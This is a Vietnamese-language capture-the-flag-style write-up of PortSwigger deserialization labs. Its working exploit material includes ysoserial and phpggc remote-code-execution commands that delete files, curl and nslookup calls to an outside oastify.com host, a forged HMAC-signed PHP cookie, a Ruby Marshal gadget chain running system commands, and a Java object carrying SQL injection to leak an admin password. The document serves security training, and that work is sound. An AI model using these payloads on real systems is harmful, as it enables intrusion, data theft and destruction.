# Insecure deserialize

## **Lab: Exploiting Java deserialization with Apache Commons**

[Lab: Exploiting Java deserialization with Apache Commons | Web Security Academy](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

- Thực hiện login vào tài khoản `wiener:peter`.
- Sau đó, thực hiện decode cookie thấy có dạng object → server sẽ desearialize . Ngoài ra, từ token này suy ra được backend dùng code java
    - POC
        
        ![image.png](Insecure%20deserialize/image.png)
        
- Thực hiện tải `ysoserial` [tại đây](https://github.com/frohoff/ysoserial)
- Thực hiện gen payload với các pre-built gadget chain. Sau đó, thực hiện URL encode, gán vào cookie và gửi. Ở đây, mình thực hiện với `CommonCollection4` và thực hiện `nslookup` thành công
    - Payload
        
        ```jsx
        java   --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED   --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED   --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED   --add-opens java.base/java.util=ALL-UNNAMED   --add-opens java.base/java.lang=ALL-UNNAMED   --add-opens java.base/java.lang.reflect=ALL-UNNAMED   -jar ysoserial-all.jar CommonsCollections4 'nslookup vpoiu2eqv4p1cmouw4c4y91fh6nxbozd.oastify.com' > a.txt
        
        ```
        
    - Kết quả
        
        ![image.png](Insecure%20deserialize/image%201.png)
        
        ![image.png](Insecure%20deserialize/image%202.png)
        
- Thay đổi command thành command xóa file
    - Payload
        
        ```jsx
        java   --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED   --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED   --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED   --add-opens java.base/java.util=ALL-UNNAMED   --add-opens java.base/java.lang=ALL-UNNAMED   --add-opens java.base/java.lang.reflect=ALL-UNNAMED   -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' > a.txt
        ```
        
    - Thay đổi cookie, hoàn thành việc giải lab
        
        ![image.png](Insecure%20deserialize/image%203.png)
        

## **Lab: Exploiting PHP deserialization with a pre-built gadget chain**

[Lab: Exploiting PHP deserialization with a pre-built gadget chain | Web Security Academy](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

- Thực hiện login bằng tài khoản `wiener:peter`.
- Thực hiện decode cookie → nhận thấy đây là serial object của PHP → test bằng `PHPGGC`
    - POC
        
        ![image.png](Insecure%20deserialize/image%204.png)
        
- Tiếp theo, khi xem src code thì mình thấy có một dòng comment
    
    ![image.png](Insecure%20deserialize/image%205.png)
    
- Thực hiện truy cập vào url trên và lấy được `SECRET_KEY`
    
    ![image.png](Insecure%20deserialize/image%206.png)
    
- Sử dụng command sau để gen ra payload
    - Command
        
        ```jsx
        ./phpggc Symfony/RCE1  'curl -X POST -d "abc:$(rm /home/carlos/morale.txt)" http://mqg9vtfhwvqsddplxvdvz026ixooch06.oastify.com' -f -b
        ```
        
    - Kết quả chạy
        
        ![image.png](Insecure%20deserialize/image%207.png)
        
- Vì cookie ở đây bị ký nên chúng ta thực hiện ký bằng secret key lấy được bằng đoạn mã sau:
    - Code
        
        ```php
        <?php
        $secret = "sczslfkyalfx7tm7n8vm8z39blk3yg7u";
        $payload ="YToyOntpOjc7Tzo0MzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxBcGN1QWRhcHRlciI6Mzp7czo2NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcQWJzdHJhY3RBZGFwdGVyAG1lcmdlQnlMaWZldGltZSI7czo5OiJwcm9jX29wZW4iO3M6NTg6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBuYW1lc3BhY2UiO2E6MDp7fXM6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBkZWZlcnJlZCI7czoxMDM6ImN1cmwgLVggUE9TVCAtZCAiYWJjOiQocm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQpIiBodHRwOi8vbXFnOXZ0Zmh3dnFzZGRwbHh2ZHZ6MDI2aXhvb2NoMDYub2FzdGlmeS5jb20iO31pOjc7aTo3O30=";
        
        $sig = hash_hmac('sha1', $payload, $secret);
        
        $new_cookie = [
            "token" => $payload,
            "sig_hmac_sha1" => $sig
        ];
        
        echo json_encode($new_cookie);
        ?>
        ```
        
    - Kết quả
        
        ![image.png](Insecure%20deserialize/image%208.png)
        
- Thực hiện gửi request đến API `GET /my-account?id=wiener` với cookie đã tạo ở bước trên. Hoàn thành việc giải lab
    - Request
        
        ![image.png](Insecure%20deserialize/image%209.png)
        
    - Trigger thành công
        
        ![image.png](Insecure%20deserialize/image%2010.png)
        
    - Hoàn thành giải lab
        
        ![image.png](Insecure%20deserialize/image%2011.png)
        

## **Lab: Exploiting Ruby deserialization using a documented gadget chain**

[Lab: Exploiting Ruby deserialization using a documented gadget chain | Web Security Academy](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)

- Thực hiện login bằng tài khoản của `wiener:peter`. Sau đó, thực hiện decode cookie thì nhận thấy đây là dạng serialized object → test deserialize
    - POC
        
        ![image.png](Insecure%20deserialize/image%2012.png)
        
- Sau đó, thưc hiện tìm kiếm tài liệu và có thể lấy được payload từ bài blog [ở đây](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html). Tuy nhiên cần sửa code một chút thành như sau:
    - Code
        
         
        
        ```php
        # Autoload the required classes
        Gem::SpecFetcher
        Gem::Installer
        
        # prevent the payload from running when we Marshal.dump it
        module Gem
          class Requirement
            def marshal_dump
              [@requirements]
            end
          end
        end
        
        wa1 = Net::WriteAdapter.new(Kernel, :system)
        
        rs = Gem::RequestSet.allocate
        rs.instance_variable_set('@sets', wa1)
        rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
        
        wa2 = Net::WriteAdapter.new(rs, :resolve)
        
        i = Gem::Package::TarReader::Entry.allocate
        i.instance_variable_set('@read', 0)
        i.instance_variable_set('@header', "aaa")
        
        n = Net::BufferedIO.allocate
        n.instance_variable_set('@io', i)
        n.instance_variable_set('@debug_output', wa2)
        
        t = Gem::Package::TarReader.allocate
        t.instance_variable_set('@io', n)
        
        r = Gem::Requirement.allocate
        r.instance_variable_set('@requirements', t)
        
        require "base64"
        payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
        puts Base64.encode64(payload)
        ```
        
- Thực hiện gen được payload, thay vào cookie
    - Kết quả chạy
        
        ![image.png](Insecure%20deserialize/image%2013.png)
        
    - Hoàn thành giải lab
        
        ![image.png](Insecure%20deserialize/image%2014.png)
        

## **Lab: Developing a custom gadget chain for Java deserialization**

[Lab: Developing a custom gadget chain for Java deserialization | Web Security Academy](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

- Thực hiện login với tài khoản `wiener:peter`. Thực hiện kiểm tra mã nguồn, nhận thấy có lộ lọt đường dẫn file backup
    - POC
        
        ![image.png](Insecure%20deserialize/image%2015.png)
        
- Thực hiện đọc code, nhận thấy có magic method `ReadObject()`+ user controllable input được thêm vào trực tiếp trong câu lệnh SQL
    - POC
        
        ![image.png](Insecure%20deserialize/image%2016.png)
        
- Nhờ vậy, mình xác định được backend dùng java và có thể có insecure deserialize ở đây. Mình thực hiện tạo lại object bằng cách dùng repo này và chỉnh sửa code:
    - Code repo [serialization-examples/java/generic at master · PortSwigger/serialization-examples · GitHub](https://github.com/PortSwigger/serialization-examples/tree/master/java/generic)
    - Thực hiện tạo thư mục với cấu trúc như sau để đảm bảo khi serialize thì server sẽ hiểu được
        - Cấu trúc thư mục
            
            ![image.png](Insecure%20deserialize/image%2017.png)
            
        - Và code như sau:
            - `ProductTemplate.java`
                
                ```php
                package data.productcatalog;
                import java.io.Serializable;
                
                public class ProductTemplate implements Serializable {
                    private static final long serialVersionUID = 1L;
                    private String id;
                    public ProductTemplate(String id) {
                        this.id = id;
                    }
                }
                ```
                
                - Nếu không khai báo `serialVersionUID = 1L` thì deserialize sẽ bị lỗi và có thể bị như sau:
                    
                    ![image.png](Insecure%20deserialize/image%2018.png)
                    
            - `Main.java`
                
                ```php
                import java.io.ByteArrayInputStream;
                import java.io.ByteArrayOutputStream;
                import java.io.ObjectInputStream;
                import java.io.ObjectOutputStream;
                import java.io.Serializable;
                import java.util.Base64;
                import data.productcatalog.ProductTemplate;
                
                class Main {
                    public static void main(String[] args) throws Exception {
                        ProductTemplate originalObject = new ProductTemplate("1'; SELECT CAST((SELECT password FROM users where username ='administrator' LIMIT 1) AS int); --");
                
                        String serializedObject = serialize(originalObject);
                
                        System.out.println("Serialized object: " + serializedObject);
                
                        ProductTemplate deserializedObject = deserialize(serializedObject);
                
                    }
                
                    private static String serialize(Serializable obj) throws Exception {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
                        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
                            out.writeObject(obj);
                        }
                        return Base64.getEncoder().encodeToString(baos.toByteArray());
                    }
                
                    private static <T> T deserialize(String base64SerializedObj) throws Exception {
                        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
                            @SuppressWarnings("unchecked")
                            T obj = (T) in.readObject();
                            return obj;
                        }
                    }
                }
                
                ```
                
- Thực hiện thay cookie đã tạo, gửi request và nhận thấy thông báo lỗi chứa password của admin
    - POC
        
        ![image.png](Insecure%20deserialize/image%2019.png)
        
    - Đăng nhập tài khoản admin và xóa user `Carlos`. Hoàn thành giải lab
        
        ![image.png](Insecure%20deserialize/image%2020.png)
        

## **Lab: Developing a custom gadget chain for PHP deserialization**

[Lab: Developing a custom gadget chain for PHP deserialization | Web Security Academy](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)